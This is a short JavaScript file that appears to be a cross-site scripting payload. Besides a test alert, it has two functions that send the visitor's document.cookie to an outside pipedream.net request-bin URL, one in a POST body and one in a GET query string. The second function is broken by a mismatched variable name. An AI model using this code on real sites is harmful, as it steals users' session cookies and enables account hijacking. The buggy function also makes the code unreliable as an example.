function sA() {
    alert("Test");
}

function fetcher() {
    fetch('https://ef5c917fe8eb329ae31be09fb465d4d8.m.pipedream.net',{method:'post', body:document.cookie});
}

function endpoint() {
    sting = "https://ef5c917fe8eb329ae31be09fb465d4d8.m.pipedream.net"+"/?"+document.cookie;
    fetch(string, {method:'GET'})
}